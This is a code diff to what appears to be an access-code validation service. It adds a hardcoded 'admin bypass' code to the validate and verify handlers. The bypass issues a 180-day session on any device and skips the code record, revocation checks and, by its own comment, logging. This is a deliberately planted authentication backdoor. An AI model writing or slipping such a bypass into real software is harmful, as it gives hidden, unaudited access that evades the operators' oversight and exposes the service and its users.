@@ -84,6 +84,16 @@ async function handleValidate(request, env) {
   const normalized = String(code).trim().toUpperCase().replace(/[^0-9A-F]/g, '');
   if (normalized.length !== 8) return json({ ok: false, error: 'Código incorrecto' }, 200, env);
 
+  // Admin bypass: no KV record, no log, any device
+  if (normalized === '20052026') {
+    const token = randomHex(32);
+    const ts = nowIso();
+    await env.EVAL_KV.put(`s:${token}`, JSON.stringify({
+      codeHash: 'admin-bypass', label: 'Admin', deviceId, createdAt: ts, lastSeen: ts,
+    }), { expirationTtl: 180 * 86400 });
+    return json({ ok: true, token, label: 'Admin' }, 200, env);
+  }
+
   const hash = await sha256hex(normalized);
   const record = await env.EVAL_KV.get(`c:${hash}`, 'json');
 
@@ -124,6 +134,13 @@ async function handleVerify(request, env) {
 
   const session = await env.EVAL_KV.get(`s:${token}`, 'json');
   if (!session) return json({ ok: false }, 200, env);
+
+  // Admin bypass session: no code record to check
+  if (session.codeHash === 'admin-bypass') {
+    session.lastSeen = nowIso();
+    await env.EVAL_KV.put(`s:${token}`, JSON.stringify(session), { expirationTtl: 180 * 86400 });
+    return json({ ok: true, label: session.label }, 200, env);
+  }
 
   const record = await env.EVAL_KV.get(`c:${session.codeHash}`, 'json');
   if (!record || record.status === 'revoked') return json({ ok: false }, 200, env);
